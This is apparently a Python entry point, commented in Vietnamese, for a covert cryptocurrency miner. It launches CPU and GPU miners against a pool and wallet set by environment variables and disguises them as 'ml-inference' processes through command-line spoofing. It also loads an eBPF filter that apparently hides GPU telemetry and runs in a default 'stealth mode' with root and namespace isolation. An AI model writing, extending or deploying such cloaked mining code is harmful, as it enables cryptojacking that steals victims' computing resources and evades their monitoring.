"""
start_mining.py

Entrypoint chính để khởi động toàn bộ hệ thống khai thác tiền điện tử.
"""

import os
import sys
import subprocess
import threading
import signal
import time
import re
import logging
from pathlib import Path
from datetime import datetime

# Thêm thư mục script vào sys.path để **resolve** (phân giải) các **local module imports** (import module cục bộ)
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import psutil
# **Import** (nhập) **cloaking utilities** (tiện ích cloaking - che giấu quy trình) cho **ml-inference process stealth** (chế độ ẩn của quy trình ml-inference)
from mining_environment.cpu_plugins.cloaking_lib.utils import (
    get_process_by_cmdline,
    spoof_cmdline,
    restore_cmdline,
    create_stealth_subprocess,
)

# **Import** (nhập) các **module** (mô-đun) từ **library** (thư viện) mining_environment
from mining_environment.scripts.logging_config import setup_logging
from mining_environment.scripts import setup_env, system_manager
from mining_environment.scripts.privileged_operations import get_privileged_manager
from mining_environment.cpu_plugins import get_inference_config

# **Import** (nhập) **Mining Performance Logger** (trình ghi log hiệu suất khai thác)
from mining_environment.logging.mining_performance_logger import (
    register_mining_process,
    log_hash_rate,
    log_resource_usage,
    log_mining_operation,
    get_real_time_metrics,
    generate_performance_comparison,
    mining_perf_logger
)

# Thiết lập **log directory path** (đường dẫn thư mục logs - tệp ghi nhật ký)
LOGS_DIR = os.getenv('LOGS_DIR', '/app/mining_environment/logs')
os.makedirs(LOGS_DIR, exist_ok=True)
logger = setup_logging('start_mining', str(Path(LOGS_DIR) / 'start_mining.log'), 'INFO')

# **Import** (nhập) các **optimized mining components** (thành phần khai thác được tối ưu hóa) nếu có sẵn
try:
    from mining_environment.cpu_plugins.optimization.system_integration import (
        integrate_with_existing_system, 
        SystemIntegrationConfig
    )
    OPTIMIZED_MINING_AVAILABLE = True
    logger.info("✅ OptimizedCalculationChain available - enhanced performance mode enabled")
except ImportError as e:
    OPTIMIZED_MINING_AVAILABLE = False
    logger.info(f"ℹ️ OptimizedCalculationChain not available: {e} - using legacy mining mode")
stop_event = threading.Event()
process_lock = threading.Lock()
cpu_process = None
gpu_process = None

# **Global variables** (biến toàn cục) cho **optimized mining** (khai thác được tối ưu hóa)
optimized_integration = None
use_optimized_mining = os.getenv('USE_OPTIMIZED_MINING', '1') == '1'

def signal_handler(signum, frame):
    logger.info(f"Nhận tín hiệu dừng ({signum}). Đang dừng hệ thống khai thác...")
    stop_event.set()

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

def initialize_environment():
    logger.info("Bắt đầu thiết lập môi trường khai thác.")
    try:
        # **Load** (tải) **ML inference configuration** (cấu hình suy luận máy học)
        ml_config = get_inference_config(process_info=None, logger=logger)
        if not ml_config.validate_configuration():
            logger.error("❌ ML inference configuration validation failed")
            sys.exit(1)

        # **Setup** (thiết lập) **environment variables** (biến môi trường) từ **config** (cấu hình)
        env_vars = ml_config.get_environment_variables()
        for key, value in env_vars.items():
            os.environ[key] = value
        
        logger.info(f"🔧 ML Inference Config: {ml_config}")
        
        privileged_manager = get_privileged_manager(logger)
        security_context = privileged_manager.validate_security_context()
        logger.info(f"Security Context: User={security_context['user']}, Root={security_context['is_root']}")
        if not security_context['is_root']:
            logger.warning("⚠️ Không chạy với quyền root - một số tính năng có thể không hoạt động")
        
        gpu_info = privileged_manager.check_gpu_access()
        logger.info(f"GPU Access: Available={gpu_info['nvidia_smi_available']}, Count={gpu_info['gpu_count']}")
        
        if os.getenv('ENABLE_EBPF_CLOAK', '1') == '1':
            preferred_path = "/opt/ebpf_filters/gpu_telemetry_filter.bpf.o"
            legacy_path = "/opt/ebpf_filters/gpu_filter.o"
            ebpf_path = preferred_path if os.path.exists(preferred_path) else legacy_path
            if os.path.exists(ebpf_path) and os.path.getsize(ebpf_path) > 0:
                if privileged_manager.load_ebpf_program(ebpf_path):
                    logger.info("✅ Đã load eBPF telemetry filter thành công")
                else:
                    logger.warning("⚠️ Không thể load eBPF telemetry filter")
            else:
                logger.info("ℹ️ eBPF filter object không tồn tại, chạy ở mock mode")
        
        setup_env.setup()
        logger.info("Thiết lập môi trường thành công.")
        return privileged_manager
    except Exception as e:
        logger.error(f"Lỗi khi thiết lập môi trường: {e}")
        sys.exit(1)
        
def start_system_manager():
    logger.info("Khởi động Resource Manager...")
    try:
        system_manager.start()
        logger.info("Resource Manager đã được khởi động.")
    except Exception as e:
        logger.error(f"Lỗi khi khởi động Resource Manager: {e}")
        stop_event.set()
        stop_system_manager()


def stop_system_manager():
    logger.info("Đang dừng Resource Manager...")
    try:
        system_manager.stop()
        logger.info("Resource Manager đã được dừng thành công.")
    except Exception as e:
        logger.error(f"Lỗi khi dừng Resource Manager: {e}")

def is_mining_process_running(process):
    return process and process.poll() is None

def rotate_log_file(log_path, max_size_mb=50):
    """
    **Log rotation** (xoay vòng log) để tránh **disk space issues** (vấn đề dung lượng đĩa)
    """
    if not os.path.exists(log_path):
        return
        
    file_size_mb = os.path.getsize(log_path) / (1024 * 1024)
    if file_size_mb > max_size_mb:
        backup_path = f"{log_path}.backup"
        if os.path.exists(backup_path):
            os.remove(backup_path)
        os.rename(log_path, backup_path)
        logger.info(f"Log file rotated: {log_path} -> {backup_path}")

def dual_logger_thread(process, log_file, process_name, log_lock):
    """
    **Thread-safe dual logging** (ghi log kép an toàn luồng) - ghi vào **file** (tệp) và **terminal** (thiết bị đầu cuối)
    """
    try:
        while True:
            line = process.stdout.readline()
            if not line:
                break
                
            # **Thread-safe logging** (ghi log an toàn luồng)
            with log_lock:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                formatted_line = f"[{timestamp}][{process_name}] {line.strip()}"
                
                # **Write to file** (ghi vào tệp)
                log_file.write(f"{formatted_line}\n".encode())
                log_file.flush()
                
                # **Print to terminal** (in ra thiết bị đầu cuối)
                print(formatted_line)
                
                # **Extract hash rate** (trích xuất tốc độ băm) from **mining output** (đầu ra khai thác)
                hash_rate_match = re.search(r'(\d+\.\d+)\s*(H/s|KH/s|MH/s|GH/s)', line)
                if hash_rate_match:
                    hash_rate = float(hash_rate_match.group(1))
                    unit = hash_rate_match.group(2)
                    
                    # **Convert to H/s** (chuyển đổi sang H/s)
                    if unit == 'KH/s':
                        hash_rate *= 1000
                    elif unit == 'MH/s':
                        hash_rate *= 1000000
                    elif unit == 'GH/s':
                        hash_rate *= 1000000000
                    
                    # **Log hash rate** (ghi log tốc độ băm) với **simple format** (định dạng đơn giản)
                    log_hash_rate(process_name, hash_rate)
                    
    except Exception as e:
        logger.error(f"Lỗi trong dual_logger_thread: {e}")
    finally:
        if log_file:
            log_file.close()

def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
    """
    **Enhanced mining process** (quy trình khai thác nâng cao) với **dual logging** (ghi log kép), 
    **log rotation** (xoay vòng log), và **thread-safe logging** (ghi log an toàn luồng).
    """
    executable = os.getenv('ML_COMMAND' if cpu else 'CUDA_COMMAND')
    if not executable or not os.path.isfile(executable) or not os.access(executable, os.X_OK):
        logger.error(f"Tệp thực thi khai thác không hợp lệ hoặc không có quyền: {executable}")
        stop_event.set()
        return None

    mining_server = os.getenv('MINING_SERVER_CPU' if cpu else 'MINING_SERVER_GPU')
    mining_wallet = os.getenv('MINING_WALLET_CPU' if cpu else 'MINING_WALLET_GPU')
    if not mining_server or not mining_wallet:
        logger.error("Biến môi trường MINING_SERVER hoặc MINING_WALLET không được thiết lập.")
        stop_event.set()
        return None

    miner_tag = 'cpu' if cpu else 'gpu'
    miner_log_path = Path(LOGS_DIR) / f"{miner_tag}_miner.log"
    
    # **Log rotation** (xoay vòng log) trước khi khởi chạy
    rotate_log_file(str(miner_log_path))
    
    # **Thread-safe lock** (khóa an toàn luồng) cho **dual logging** (ghi log kép)
    log_lock = threading.Lock()

    # Xác định **process name** (tên tiến trình) từ **resource_config.json** (tệp cấu hình tài nguyên)
    process_name = "ml-inference" if cpu else "inference-cuda"
    
    mining_command = [executable, '-o', mining_server, '-u', mining_wallet, '--tls']
    if cpu:
        mining_command.extend(['-a', 'rx/0', '--no-huge-pages'])
    else:
        cuda_loader = os.getenv('MLLS_CUDA', '/usr/local/bin/libmlls-cuda.so')
        mining_command.extend(['--cuda', f'--cuda-loader={cuda_loader}', '-a', 'kawpow'])

    enable_ns = os.getenv('ENABLE_NS_ISOLATION', '1') == '1'
    enable_stealth = os.getenv('ENABLE_STEALTH_MODE', '1') == '1'
    
    if enable_ns and privileged_manager:
        logger.info("Sử dụng PrivilegedOperationManager cho namespace isolation")

    for attempt in range(1, retries + 1):
        logger.info(f"Thử khởi chạy quá trình khai thác {'CPU' if cpu else 'GPU'} (Lần {attempt}/{retries})...")
        try:
            # **Create subprocess** (tạo tiến trình con) với **PIPE** (đường ống) cho **dual logging** (ghi log kép)
            if enable_stealth and cpu:
                # **Stealth subprocess** (tiến trình con ẩn danh) - **modified for dual logging** (sửa đổi cho ghi log kép)
                process = subprocess.Popen(
                    mining_command,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    universal_newlines=True,
                    bufsize=1
                )
                if process:
                    # **Spoof process name** (giả mạo tên tiến trình) sau khi khởi chạy
                    try:
                        spoof_cmdline(process.pid, process_name)
                        logger.info(f"✅ Stealth process '{process_name}' started with PID: {process.pid}")
                    except Exception as e:
                        logger.warning(f"⚠️ Không thể spoof cmdline: {e}")
            elif enable_ns and privileged_manager:
                # **Namespace isolation** (cô lập namespace) - **modified for dual logging** (sửa đổi cho ghi log kép)
                process = subprocess.Popen(
                    mining_command,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    universal_newlines=True,
                    bufsize=1
                )
            else:
                # **Standard subprocess** (tiến trình con tiêu chuẩn)
                process = subprocess.Popen(
                    mining_command,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    universal_newlines=True,
                    bufsize=1
                )
            
            if process:
                logger.info(f"Quá trình khai thác {'CPU' if cpu else 'GPU'} đã được khởi động với PID: {process.pid}")
                
                # **Register process** (đăng ký tiến trình) với **Mining Performance Logger** (trình ghi log hiệu suất khai thác)
                register_mining_process(process_name, process.pid, process)
                
                # **Simple operation logging** (ghi log thao tác đơn giản) - **remove JSON format** (loại bỏ định dạng JSON)
                logger.info(f"START: {process_name} PID={process.pid} CMD={' '.join(mining_command)}")
                
                # **Open log file** (mở tệp log) cho **dual logging** (ghi log kép)
                log_file = open(miner_log_path, 'ab', buffering=0)
                
                # **Start dual logging thread** (khởi chạy luồng ghi log kép)
                log_thread = threading.Thread(
                    target=dual_logger_thread,
                    args=(process, log_file, process_name, log_lock),
                    daemon=True
                )
                log_thread.start()
                
                # **Start simple log monitoring** (bắt đầu giám sát log đơn giản) - **remove JSON format** (loại bỏ định dạng JSON)
                mining_perf_logger.monitor_process_logs(process_name, str(miner_log_path))
                
                time.sleep(2)
                if process.poll() is not None:
                    logger.error(f"Quá trình khai thác {'CPU' if cpu else 'GPU'} kết thúc sớm.")
                    
                    # **Simple early termination logging** (ghi log kết thúc sớm đơn giản)
                    logger.error(f"EARLY_TERMINATION: {process_name} PID={process.pid} EXIT_CODE={process.returncode}")
                    process = None
                else:
                    return process
                    
        except Exception as e:
            logger.error(f"Lỗi khi khởi động quá trình khai thác {'CPU' if cpu else 'GPU'}: {e}")
            process = None
        if attempt < retries:
            logger.info(f"Đợi {delay} giây trước khi thử lại...")
            time.sleep(delay)
    logger.error(f"Không thể khởi chạy quá trình khai thác {'CPU' if cpu else 'GPU'}.")
    stop_event.set()
    return None

def initialize_optimized_mining(privileged_mgr):
    """
    Khởi tạo **OptimizedCalculationChain** (chuỗi tính toán được tối ưu hóa) với **ml-inference process integration** (tích hợp quy trình suy luận máy học).
    **Enhanced** (cải tiến) để khắc phục **CPU utilization 0% issue** (vấn đề sử dụng CPU 0%).
    """
    global optimized_integration
    
    if not OPTIMIZED_MINING_AVAILABLE or not use_optimized_mining:
        logger.info("OptimizedCalculationChain not enabled, falling back to legacy mining")
        return False
    
    try:
        logger.info("Initializing OptimizedCalculationChain...")
        
        # Lấy configuration từ InferenceConfigService (cấu hình suy luận máy học)
        inf_cfg = get_inference_config(process_info=None, logger=logger)
        cores = inf_cfg.get_max_cpu_threads()
        
        logger.info(f"🚀 Initializing với {cores} cores cho {inf_cfg.get_cpu_process_name()}")
        
        # Tạo **integration config** (cấu hình tích hợp) với **stealth mode** (chế độ ẩn danh)
        config = SystemIntegrationConfig(
            enable_optimized_chain=True,
            fallback_to_legacy=True,
            throttling_compatibility=True,
            monitoring_enabled=True,
            auto_performance_tuning=True,
            stealth_mode_compatible=inf_cfg.is_stealth_mode_enabled()
        )
        
        # Khởi tạo **system integration** (tích hợp hệ thống)
        optimized_integration = integrate_with_existing_system(
            cores=cores,
            throttling_manager=None,  # Will be injected later
            logger=logger
        )
        
        if optimized_integration:
            # Sử dụng **enhanced mining session config** (cấu hình phiên khai thác cải tiến) từ **MLInferenceConfig**
            from mining_environment.cpu_plugins.optimization.mining_integration_adapter import MiningSessionConfig
            
            # Lấy optimized config từ InferenceConfigService
            config_data = inf_cfg.get_mining_session_config()
            session_config = MiningSessionConfig(
                profile=config_data["profile"],
                total_iterations=config_data["total_iterations"],
                batch_size=config_data["batch_size"],
                monitoring_interval=config_data["monitoring_interval"],
                auto_restart=config_data["auto_restart"],
                throttling_enabled=config_data["throttling_enabled"],
                stealth_mode=config_data["stealth_mode"]
            )
            
            # Khởi động **optimized mining session** (phiên khai thác được tối ưu hóa) với **enhanced config** (cấu hình cải tiến)
            if optimized_integration.start_optimized_mining(session_config):
                logger.info("✅ OptimizedCalculationChain đã khởi động thành công")
                
                # Xác minh các **CPU workers** (tiến trình làm việc CPU) thực sự đang chạy
                time.sleep(2)
                status = optimized_integration.get_system_performance_status()
                if status.get('optimized_mining_active', False):
                    logger.info("🚀 Sử dụng OptimizedCalculationChain cho CPU mining")
                    return True
                else:
                    logger.error("❌ OptimizedCalculationChain started but not active")
                    return False
            else:
                logger.error("❌ Không thể khởi động OptimizedCalculationChain")
                optimized_integration.cleanup()
                optimized_integration = None
                return False
        else:
            logger.error("❌ Không thể tạo OptimizedSystemIntegration")
            return False
            
    except Exception as e:
        logger.error(f"Lỗi khi khởi tạo OptimizedCalculationChain: {e}")
        if optimized_integration:
            optimized_integration.cleanup()
            optimized_integration = None
        return False

def manage_cpu_miner(privileged_mgr, max_retries: int = 5):
    """
    Quản lý **lifecycle** (vòng đời) của **CPU miner** (máy khai thác CPU), bao gồm **restart** (khởi động lại) và áp dụng **throttling** (điều chỉnh tốc độ).
    **Enhanced** (cải tiến) với **OptimizedCalculationChain support** (hỗ trợ chuỗi tính toán được tối ưu hóa).
    """
    global cpu_process, optimized_integration
    retries = 0
    
    # Thử **optimized mining** (khai thác được tối ưu hóa) trước tiên
    if initialize_optimized_mining(privileged_mgr):
        logger.info("🚀 Sử dụng OptimizedCalculationChain cho CPU mining")
        
        # **Monitor** (giám sát) **optimized mining** (khai thác được tối ưu hóa)
        while not stop_event.is_set() and retries < max_retries:
            try:
                if optimized_integration and optimized_integration.optimized_mining_active:
                    # Lấy **performance status** (trạng thái hiệu suất)
                    status = optimized_integration.get_system_performance_status()
                    if status.get('optimized_mining_active', False):
                        # **Reset retries** (đặt lại số lần thử) nếu **mining** (khai thác) đang hoạt động
                        retries = 0
                        
                        # **Log performance** (ghi nhật ký hiệu suất) theo định kỳ
                        if status.get('mining_performance'):
                            perf = status['mining_performance']
                            logger.debug(f"OptimizedMining: {perf['total_cpu_utilization']:.1f}% CPU, "
                                       f"{perf['hashrate']:.2f} H/s, {perf['active_workers']} workers")
                            
                            # **Log hash rate** (ghi log tốc độ băm) và **resource usage** (mức sử dụng tài nguyên)
                            log_hash_rate("ml-inference", perf['hashrate'], {
                                "cpu_utilization": perf['total_cpu_utilization'],
                                "active_workers": perf['active_workers']
                            })
                            log_resource_usage("ml-inference")
                    else:
                        # **Optimized mining** (khai thác được tối ưu hóa) đã dừng, thử **restart** (khởi động lại)
                        logger.warning("OptimizedCalculationChain stopped, attempting restart...")
                        if not optimized_integration.start_optimized_mining():
                            retries += 1
                            logger.error(f"Failed to restart OptimizedCalculationChain ({retries}/{max_retries})")
                else:
                    # **Integration** (tích hợp) bị mất, thử **reinitialize** (khởi tạo lại)
                    logger.warning("OptimizedSystemIntegration lost, attempting reinitialize...")
                    if not initialize_optimized_mining(privileged_mgr):
                        retries += 1
                        logger.error(f"Failed to reinitialize optimized mining ({retries}/{max_retries})")
                
                # **Wait** (chờ) trước khi kiểm tra tiếp theo
                stop_event.wait(30)
                
            except Exception as e:
                logger.error(f"Error trong optimized mining monitoring: {e}")
                retries += 1
                stop_event.wait(10)
        
        # Nếu **optimized mining** (khai thác được tối ưu hóa) thất bại quá nhiều lần, **cleanup** (dọn dẹp) và **fallback** (quay về phương án dự phòng)
        if retries >= max_retries:
            logger.error("OptimizedCalculationChain thất bại quá nhiều lần, fallback to legacy mining")
            if optimized_integration:
                optimized_integration.cleanup()
                optimized_integration = None
        else:
            # **Optimized mining** (khai thác được tối ưu hóa) hoàn thành thành công
            return
    
    # **Fallback** (quay về) **legacy mining process** (quy trình khai thác cũ)
    logger.info("🔄 Fallback to legacy subprocess-based CPU mining")
    retries = 0
    while not stop_event.is_set() and retries < max_retries:
        with process_lock:
            if not is_mining_process_running(cpu_process):
                cpu_process = start_mining_process(cpu=True, privileged_manager=privileged_mgr)
                # **Logic throttling** (logic điều chỉnh tốc độ) đã được chuyển hoàn toàn cho **CPU Plugin Framework** (khung plugin CPU)
                # Việc gọi **setup_cpu_throttling** (thiết lập điều chỉnh CPU) đã bị loại bỏ tại đây
                if not is_mining_process_running(cpu_process):
                    retries += 1
                    logger.warning(f"CPU miner khởi động thất bại. Thử lại... ({retries}/{max_retries})")
                else:
                    logger.info("CPU miner đã khởi động, việc quản lý **throttling** (điều chỉnh tốc độ) được giao cho **ResourceManager** (trình quản lý tài nguyên).")
                    retries = 0  # Reset retries on successful start
            else:
                # Nếu **process** (tiến trình) đang chạy, **reset retries** (đặt lại số lần thử)
                retries = 0
                
                # **Log resource usage** (ghi log mức sử dụng tài nguyên) cho **legacy CPU mining** (khai thác CPU cũ)
                log_resource_usage("ml-inference")
        
        # **Wait** (đợi) trước khi kiểm tra lại
        stop_event.wait(30)
    if retries >= max_retries:
        logger.error("CPU miner đã thất bại quá nhiều lần. Dừng giám sát.")
        stop_event.set()

def manage_gpu_miner(privileged_mgr, max_retries: int = 5):
    """
    Quản lý **lifecycle** (vòng đời) của **GPU miner** (máy khai thác GPU). Hàm này không chứa **logic throttling** (logic điều chỉnh tốc độ).
    """
    global gpu_process
    retries = 0
    while not stop_event.is_set() and retries < max_retries:
        with process_lock:
            process = gpu_process
        if not is_mining_process_running(process):
            if process:
                logger.warning("Phát hiện GPU miner đã dừng. Thử khởi động lại...")
                retries += 1
            new_process = start_mining_process(cpu=False, privileged_manager=privileged_mgr)
            with process_lock:
                gpu_process = new_process
        else:
            # **Log resource usage** (ghi log mức sử dụng tài nguyên) cho **GPU mining** (khai thác GPU)
            log_resource_usage("inference-cuda", force_gpu_check=True)
        
        time.sleep(15)
    if retries >= max_retries:
        logger.error("GPU miner đã thất bại quá nhiều lần. Dừng giám sát.")
        stop_event.set()

def main():
    """
    **Redesigned main function** (hàm chính được thiết kế lại) với **Parallel Initialization Framework** (khung khởi tạo song song).
    Theo **blueprint** (thiết kế): Khởi tạo song song **CPU và GPU mining processes** (các quy trình khai thác CPU và GPU) + 
    kích hoạt đồng thời các **modules** (mô-đun) trong **scripts/** (thư mục scripts).
    """
    logger.info("===== Bắt đầu hoạt động khai thác tiền điện tử (Parallel Architecture) =====")
    
    # Khởi tạo **environment** (môi trường)
    privileged_manager = initialize_environment()
    
    # Khởi động **Resource Manager** (trình quản lý tài nguyên) - **System Manager** (trình quản lý hệ thống)
    start_system_manager()
    
    
    # Tạo **threads** (luồng) để chạy song song **CPU và GPU mining** (khai thác CPU và GPU)
    cpu_thread = threading.Thread(target=manage_cpu_miner, args=(privileged_manager,), daemon=True, name="CPUMiningThread")
    gpu_thread = threading.Thread(target=manage_gpu_miner, args=(privileged_manager,), daemon=True, name="GPUMiningThread")
    
    # Khởi động các **threads** (luồng) song song
    logger.info("🚀 Khởi động parallel mining threads...")
    cpu_thread.start()
    
    # Khởi động **GPU thread** (luồng GPU) nếu được **configured** (cấu hình)
    if os.getenv('MINING_SERVER_GPU') and os.getenv('MINING_WALLET_GPU'):
        gpu_thread.start()
        logger.info("✅ Đã khởi động cả CPU và GPU mining threads")
    else:
        logger.info("✅ Chỉ khởi động CPU mining thread (GPU không được cấu hình)")
    
    # **Performance monitoring thread** (luồng giám sát hiệu suất)
    def performance_monitor():
        """Monitor và display real-time mining performance"""
        last_report_time = time.time()
        
        while not stop_event.is_set():
            try:
                # **Generate performance report** (tạo báo cáo hiệu suất) mỗi 60 giây
                if time.time() - last_report_time >= 60:
                    comparison_report = generate_performance_comparison()
                    logger.info("=== MINING PERFORMANCE REPORT ===")
                    for line in comparison_report.split('\n'):
                        if line.strip():
                            logger.info(line)
                    logger.info("=== END PERFORMANCE REPORT ===")
                    last_report_time = time.time()
                
                # **Display real-time metrics** (hiển thị chỉ số thời gian thực) mỗi 30 giây
                metrics = get_real_time_metrics()
                cpu_metrics = metrics.get("ml-inference", {})
                gpu_metrics = metrics.get("inference-cuda", {})
                
                logger.info(f"📊 REAL-TIME: CPU {cpu_metrics.get('current_hash_rate', 0):.2f} H/s | "
                           f"GPU {gpu_metrics.get('current_hash_rate', 0):.2f} H/s | "
                           f"Total {cpu_metrics.get('current_hash_rate', 0) + gpu_metrics.get('current_hash_rate', 0):.2f} H/s")
                
                time.sleep(30)
            except Exception as e:
                logger.error(f"Error in performance monitoring: {e}")
                time.sleep(30)
    
    # **Start performance monitoring thread** (khởi động luồng giám sát hiệu suất)
    perf_thread = threading.Thread(target=performance_monitor, daemon=True, name="PerformanceMonitor")
    perf_thread.start()
    
    # **Wait** (đợi) các **threads** (luồng) hoạt động và xử lý **stop signal** (tín hiệu dừng)
    try:
        while not stop_event.is_set():
            # Kiểm tra **thread status** (trạng thái luồng)
            if not cpu_thread.is_alive():
                logger.warning("⚠️ CPU mining thread đã dừng")
            if gpu_thread.is_alive() and not gpu_thread.is_alive():
                logger.warning("⚠️ GPU mining thread đã dừng")
            
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("Nhận tín hiệu KeyboardInterrupt. Đang dừng...")
        stop_event.set()
    
    # Dừng **system manager** (trình quản lý hệ thống)
    stop_system_manager()
    
    # **Cleanup** (dọn dẹp) và thoát
    logger.info("Bắt đầu quá trình dọn dẹp cuối cùng...")
    
    # **Export final performance report** (xuất báo cáo hiệu suất cuối cùng)
    try:
        final_report = generate_performance_comparison()
        logger.info("=== FINAL MINING PERFORMANCE REPORT ===")
        for line in final_report.split('\n'):
            if line.strip():
                logger.info(line)
        logger.info("=== END FINAL REPORT ===")
        
        # **Export to file** (xuất ra file)
        report_file = mining_perf_logger.export_performance_report()
        logger.info(f"📄 Final performance report saved to: {report_file}")
        
    except Exception as e:
        logger.error(f"Error generating final performance report: {e}")
    
    # **Log final mining operations** (ghi log các thao tác khai thác cuối cùng)
    with process_lock:
        if cpu_process:
            log_mining_operation("ml-inference", "STOP", cpu_process.pid, 
                                {"reason": "shutdown", "uptime": time.time()})
        if gpu_process:
            log_mining_operation("inference-cuda", "STOP", gpu_process.pid, 
                                {"reason": "shutdown", "uptime": time.time()})
    
    # **Cleanup** (dọn dẹp) **optimized mining** (khai thác được tối ưu hóa) trước tiên
    global optimized_integration
    if optimized_integration:
        logger.info("Dừng OptimizedCalculationChain...")
        try:
            optimized_integration.cleanup()
            optimized_integration = None
            logger.info("✅ OptimizedCalculationChain đã dừng")
        except Exception as e:
            logger.error(f"Lỗi khi dừng OptimizedCalculationChain: {e}")
    
    # **Cleanup** (dọn dẹp) **legacy processes** (các tiến trình cũ)
    with process_lock:
        if cpu_process:
            logger.info(f"Dừng tiến trình CPU miner (PID: {cpu_process.pid})...")
            cpu_process.terminate()
        if gpu_process:
            logger.info(f"Dừng tiến trình GPU miner (PID: {gpu_process.pid})...")
            gpu_process.terminate()
    
    logger.info("Hệ thống đã dừng. Thoát.")

if __name__ == "__main__":
    main()
